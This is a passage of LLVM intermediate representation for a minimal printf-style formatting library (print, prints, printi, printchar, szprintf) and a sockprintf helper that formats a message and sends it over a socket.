  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #4

declare i64 @write(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #4
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #4
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

declare i64 @send(i32, i8*, i64, i32) #5

